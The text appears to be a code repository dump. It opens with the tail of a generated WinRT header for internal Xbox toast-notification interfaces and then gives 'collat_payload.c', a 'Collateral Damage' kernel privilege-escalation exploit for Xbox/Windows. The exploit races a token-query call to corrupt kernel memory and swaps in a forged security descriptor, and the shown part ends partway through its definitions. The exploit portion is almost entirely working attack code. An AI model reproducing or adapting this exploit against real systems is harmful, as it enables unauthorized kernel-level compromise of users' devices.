    ( (This)->lpVtbl->FireStandardNotification(This,type,param1,param2,param3) )


#endif /* COBJMACROS */


EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IToastManagerInternal
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Interface is a part of the implementation of type Windows.Xbox.UI.Internal.ToastNotifications.ToastManager
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IToastManagerInternal[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IToastManagerInternal";
/* [object, uuid("154762D0-7895-45AF-BA7B-A1DAE10E07E3"), exclusiveto, contract] */
typedef struct __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternalVtbl
{
    BEGIN_INTERFACE
    HRESULT ( STDMETHODCALLTYPE *QueryInterface)(
    __RPC__in __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal * This,
    /* [in] */ __RPC__in REFIID riid,
    /* [annotation][iid_is][out] */
    _COM_Outptr_  void **ppvObject
    );

ULONG ( STDMETHODCALLTYPE *AddRef )(
    __RPC__in __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal * This
    );

ULONG ( STDMETHODCALLTYPE *Release )(
    __RPC__in __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal * This
    );

HRESULT ( STDMETHODCALLTYPE *GetIids )(
    __RPC__in __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal * This,
    /* [out] */ __RPC__out ULONG *iidCount,
    /* [size_is][size_is][out] */ __RPC__deref_out_ecount_full_opt(*iidCount) IID **iids
    );

HRESULT ( STDMETHODCALLTYPE *GetRuntimeClassName )(
    __RPC__in __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal * This,
    /* [out] */ __RPC__deref_out_opt HSTRING *className
    );

HRESULT ( STDMETHODCALLTYPE *GetTrustLevel )(
    __RPC__in __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal * This,
    /* [OUT ] */ __RPC__out TrustLevel *trustLevel
    );
HRESULT ( STDMETHODCALLTYPE *OnWpnUserServiceStatusChanged )(
        __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal * This,
        /* [in] */UINT32 userId,
        /* [in] */UINT32 eventType
        );
    END_INTERFACE
    
} __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternalVtbl;

interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal
{
    CONST_VTBL struct __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternalVtbl *lpVtbl;
};

#ifdef COBJMACROS
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_QueryInterface(This,riid,ppvObject) \
( (This)->lpVtbl->QueryInterface(This,riid,ppvObject) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_AddRef(This) \
        ( (This)->lpVtbl->AddRef(This) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_Release(This) \
        ( (This)->lpVtbl->Release(This) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_GetIids(This,iidCount,iids) \
        ( (This)->lpVtbl->GetIids(This,iidCount,iids) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_GetRuntimeClassName(This,className) \
        ( (This)->lpVtbl->GetRuntimeClassName(This,className) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_GetTrustLevel(This,trustLevel) \
        ( (This)->lpVtbl->GetTrustLevel(This,trustLevel) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_OnWpnUserServiceStatusChanged(This,userId,eventType) \
    ( (This)->lpVtbl->OnWpnUserServiceStatusChanged(This,userId,eventType) )


#endif /* COBJMACROS */


EXTERN_C const IID IID___x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal;
#endif /* !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_INTERFACE_DEFINED__) */
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.InboxAction
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IInboxAction ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 * Class Marshaling Behavior:  Agile - Class is agile
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxAction_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxAction_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_InboxAction[] = L"Windows.Xbox.UI.Internal.ToastNotifications.InboxAction";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.InboxActor
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IInboxActor ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 * Class Marshaling Behavior:  Agile - Class is agile
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxActor_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxActor_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_InboxActor[] = L"Windows.Xbox.UI.Internal.ToastNotifications.InboxActor";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.InboxGameType
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IInboxGameType ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 * Class Marshaling Behavior:  Agile - Class is agile
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxGameType_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxGameType_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_InboxGameType[] = L"Windows.Xbox.UI.Internal.ToastNotifications.InboxGameType";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.InboxManager
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * RuntimeClass contains static methods.
 *   Static Methods exist on the Windows.Xbox.UI.Internal.ToastNotifications.IInboxManager interface starting with version 1.0 of the Windows.Xbox.Shell.ToastNotificationsContract API contract
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 * Class Marshaling Behavior:  Agile - Class is agile
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxManager_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxManager_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_InboxManager[] = L"Windows.Xbox.UI.Internal.ToastNotifications.InboxManager";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.InboxNotification
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotification ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 * Class Marshaling Behavior:  Agile - Class is agile
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxNotification_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxNotification_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_InboxNotification[] = L"Windows.Xbox.UI.Internal.ToastNotifications.InboxNotification";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.InboxNotificationOptions
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotificationOptions ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 * Class Marshaling Behavior:  Agile - Class is agile
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxNotificationOptions_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxNotificationOptions_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_InboxNotificationOptions[] = L"Windows.Xbox.UI.Internal.ToastNotifications.InboxNotificationOptions";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.PickerOption
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IPickerOption ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_PickerOption_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_PickerOption_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_PickerOption[] = L"Windows.Xbox.UI.Internal.ToastNotifications.PickerOption";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.Toast
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToast ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_Toast_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_Toast_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_Toast[] = L"Windows.Xbox.UI.Internal.ToastNotifications.Toast";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastAction
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastAction ** Default Interface **
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow
 *    Windows.Xbox.UI.Internal.ToastNotifications.IVerbQuickRow
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastAction_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastAction_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastAction[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastAction";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastEditInput
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow ** Default Interface **
 *    Windows.Xbox.UI.Internal.ToastNotifications.IEditQuickRow
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastEditInput_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastEditInput_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastEditInput[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastEditInput";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastImage
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastImage ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastImage_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastImage_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastImage[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastImage";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastManager
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * RuntimeClass contains static methods.
 *   Static Methods exist on the Windows.Xbox.UI.Internal.ToastNotifications.IToastManagerInternal interface starting with version 1.0 of the Windows.Xbox.Shell.ToastNotificationsContract API contract
 *   Static Methods exist on the Windows.Xbox.UI.Internal.ToastNotifications.IToastManager interface starting with version 1.0 of the Windows.Xbox.Shell.ToastNotificationsContract API contract
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastManager_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastManager_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastManager[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastManager";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastPickerInput
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow ** Default Interface **
 *    Windows.Xbox.UI.Internal.ToastNotifications.IPickerQuickRow
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastPickerInput_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastPickerInput_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastPickerInput[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastPickerInput";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastPopupModel
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastPopupModel ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastPopupModel_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastPopupModel_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastPopupModel[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastPopupModel";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastStoreGroup
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastStoreGroup ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastStoreGroup_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastStoreGroup_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastStoreGroup[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastStoreGroup";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastStoreModel
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastStoreModel ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastStoreModel_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastStoreModel_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastStoreModel[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastStoreModel";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000






#endif // defined(__cplusplus)
#pragma pop_macro("MIDL_CONST_ID")
#endif // __Windows2EXbox2EUI2EInternal2EToastNotifications_p_h__

#endif // __Windows2EXbox2EUI2EInternal2EToastNotifications_h__

```

`collat_payload/collat_payload.c`:

```c
//
// Collateral Damage - Emma Kirkpatrick @carrot_c4k3 & Lander Brandt @landaire (exploits.forsale)
//
#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <sddl.h>
#include <winsock2.h>

#include "ioring.h"
#include "nt_offsets.h"
#include "winrt.h"

// socket stuff
WSADATA wsaData;
SOCKET winSock;
struct sockaddr_in sockAddr;
int port = 7070;


// struct representing the info passed in from gamescript at a static address
typedef struct _COLLAT_INFO {
    CHAR ip_addr[0x20];
} COLLAT_INFO;

#define GLOBAL_INFO ((COLLAT_INFO*)0x44000000)

ULONG64 ullSystemEPROCaddr = 0;
UINT64 g_kernel_base = 0;


// misc windows definitions
#define STATUS_SUCCESS ((NTSTATUS)0)
#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
#define SystemBuildVersionInformation 222

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _Out_writes_bytes_to_opt_(TokenInformationLength, *ReturnLength) PVOID TokenInformation,
    _In_ ULONG TokenInformationLength,
    _Out_ PULONG ReturnLength
);

// All the code for triggering the bug lives here
volatile ULONG64* smash_ptr = NULL;
ULONG64 smash_var = 0;

// this function will run in a second thread to attempt to trigger the bug
DWORD smash_func(LPVOID unused)
{
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    ULONG64 val = smash_var;
    while (1) {
        *smash_ptr = val;
    }

    return 0;
}

WCHAR* magic_str = L"TSA://ProcUnique";
HANDLE token_handle = INVALID_HANDLE_VALUE;
BYTE output_buf[0x8000];
DWORD bytes_returned = 0;
WCHAR* test_ptr = 0;

VOID do_write(UINT64 addr)
{
    smash_var = addr;

    HANDLE hthread = CreateThread(NULL, 0, smash_func, NULL, 0, NULL);

    for (UINT i = 0; i < 0x80000; i++) //while (1)
    {
        *test_ptr = 0;
        NtQueryInformationToken(token_handle, TokenAccessInformation, output_buf, sizeof(output_buf), &bytes_returned);
        if (*test_ptr == 0)
        {
            break;
        }
    }
    TerminateThread(hthread, 0);
}

// build a security descriptor which is accessible to our process
void setup_sd()
{
    PBYTE sd_page = VirtualAlloc(0x65000000, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    PBYTE psid_system = sd_page;
    psid_system[0] = 0x01;
    psid_system[1] = 0x01;
    psid_system[2] = 0x00;
    psid_system[3] = 0x00;
    psid_system[4] = 0x00;
    psid_system[5] = 0x00;
    psid_system[6] = 0x00;
    psid_system[7] = 0x05;
    psid_system[8] = 0x12;
    psid_system[9] = 0x00;
    psid_system[10] = 0x00;
    psid_system[11] = 0x00;
    psid_system[12] = 0x00;
    psid_system[13] = 0x00;
    psid_system[14] = 0x00;
    psid_system[15] = 0x00;

    PBYTE sacl_ptr = sd_page + 0x100;
    sacl_ptr[0] = 0x02;
    sacl_ptr[1] = 0x00;
    sacl_ptr[2] = 0x20;
    sacl_ptr[3] = 0x00;
    sacl_ptr[4] = 0x01;
    sacl_ptr[5] = 0x00;
    sacl_ptr[6] = 0x00;
    sacl_ptr[7] = 0x00;
    sacl_ptr[8] = 0x11;
    sacl_ptr[9] = 0x00;
    sacl_ptr[10] = 0x14;
    sacl_ptr[11] = 0x00;
    sacl_ptr[12] = 0x02;
    sacl_ptr[13] = 0x00;
    sacl_ptr[14] = 0x00;
    sacl_ptr[15] = 0x00;
    sacl_ptr[16] = 0x01;
    sacl_ptr[17] = 0x01;
    sacl_ptr[18] = 0x00;
    sacl_ptr[19] = 0x00;
    sacl_ptr[20] = 0x00;
    sacl_ptr[21] = 0x00;
    sacl_ptr[22] = 0x00;
    sacl_ptr[23] = 0x10;
    sacl_ptr[24] = 0x00;
    sacl_ptr[25] = 0x10;
    sacl_ptr[26] = 0x00;
    sacl_ptr[27] = 0x00;
    sacl_ptr[28] = 0x00;
    sacl_ptr[29] = 0x00;

    PBYTE dacl_ptr = sd_page + 0x200;
    dacl_ptr[0] = 0x02;
    dacl_ptr[1] = 0x00;
    dacl_ptr[2] = 0x00;
    dacl_ptr[3] = 0x01;
    dacl_ptr[4] = 0x02;
    dacl_ptr[5] = 0x00;
    dacl_ptr[6] = 0x00;
    dacl_ptr[7] = 0x00;
    dacl_ptr[8] = 0x00;
    dacl_ptr[9] = 0x00;
    dacl_ptr[10] = 0x18;
    dacl_ptr[11] = 0x00;
    dacl_ptr[12] = 0xFF;
    dacl_ptr[13] = 0xFF;
    dacl_ptr[14] = 0xFF;
    dacl_ptr[15] = 0xFF;
    dacl_ptr[16] = 0x01;
    dacl_ptr[17] = 0x02;
    dacl_ptr[18] = 0x00;
    dacl_ptr[19] = 0x00;
    dacl_ptr[20] = 0x00;
    dacl_ptr[21] = 0x00;
    dacl_ptr[22] = 0x00;
    dacl_ptr[23] = 0x0F;
    dacl_ptr[24] = 0x02;
    dacl_ptr[25] = 0x00;
    dacl_ptr[26] = 0x00;
    dacl_ptr[27] = 0x00;
    dacl_ptr[28] = 0x01;
    dacl_ptr[29] = 0x00;
    dacl_ptr[30] = 0x00;
    dacl_ptr[31] = 0x00;
    dacl_ptr[32] = 0x00;
    dacl_ptr[33] = 0x00;
    dacl_ptr[34] = 0x14;
    dacl_ptr[35] = 0x00;
    dacl_ptr[36] = 0xFF;
    dacl_ptr[37] = 0xFF;
    dacl_ptr[38] = 0xFF;
    dacl_ptr[39] = 0xFF;
    dacl_ptr[40] = 0x01;
    dacl_ptr[41] = 0x01;
    dacl_ptr[42] = 0x00;
    dacl_ptr[43] = 0x00;
    dacl_ptr[44] = 0x00;
    dacl_ptr[45] = 0x00;
    dacl_ptr[46] = 0x00;
    dacl_ptr[47] = 0x01;
    dacl_ptr[48] = 0x00;
    dacl_ptr[49] = 0x00;
    dacl_ptr[50] = 0x00;
    dacl_ptr[51] = 0x00;

    PISECURITY_DESCRIPTOR sd = 0x65007500;
    sd->Revision = 1;
    sd->Sbz1 = 0;
    sd->Control = 0x14;
    sd->Owner = psid_system;
    sd->Group = psid_system;
    sd->Sacl = sacl_ptr;
    sd->Dacl = dacl_ptr;
    return 0;
}

int do_exploit()
{
    ULONG sd_ptr_offset = get_sd_ptr_offset();

    // map the fake security descriptor that we will be swapping the real one with
    setup_sd();

    // grab the kernel base first!
    ULONG ret_len = 0;
    UINT64 nt_base = g_kernel_base;

    // get our token handle so we can prepare to trigger the bug
    OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &token_handle);
    NtQueryInformationToken(token_handle, TokenAccessInformation, output_buf, sizeof(output_buf), &bytes_returned);

    // search for the string attribute string ("TSA://ProcUnique")
    UINT64 magic_ptr = 0;
    for (UINT i = 0; i < sizeof(output_buf) - 0x20; i++)
    {
        if (memcmp(&output_buf[i], magic_str, 0x20) == 0) {
            magic_ptr = &output_buf[i];
            break;
        }
    }
    test_ptr = magic_ptr;

    // search for the pointer to the string to get the actual smash target
    for (UINT i = 0; i < sizeof(output_buf) - 0x20; i++)
    {
        if (memcmp(&output_buf[i], &magic_ptr, 8) == 0) {
            smash_ptr = &output_buf[i];
            break;
        }
    }

    getobjptr(&ullSystemEPROCaddr, 4, 4);

    // corrupt the security descriptor
    do_write(nt_base + sd_ptr_offset - 0x18);
    do_write(nt_base + sd_ptr_offset - 0x18 - 1);
    do_write(nt_base + sd_ptr_offset - 0x18 - 2);
    do_write(nt_base + sd_ptr_offset - 0x18 - 3);

    ullSystemEPROCaddr = 0;
    getobjptr(&ullSystemEPROCaddr, 4, 4);

    return 0;
}

#define STEP 0x100000
#define ITERATIONS 0x80
#define DUMMY_ITERATIONS 5
#define KERNEL_LOWER_BOUND 0xFFFFF80000A00000ull
